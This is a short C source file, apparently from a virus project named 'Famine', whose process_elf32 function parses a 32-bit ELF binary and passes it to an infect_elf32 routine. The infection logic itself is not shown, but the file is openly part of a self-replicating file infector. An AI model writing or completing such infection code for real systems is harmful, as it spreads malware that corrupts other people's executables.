#include "famine.h"

int process_elf32(t_file *file)
{
	t_elf32 elf32;

	if (parse_elf32(file, &elf32)) {
		LOG("[!] Failed to parse ELF32\n");
		return (1);
	}

	return (infect_elf32(file, &elf32));
}
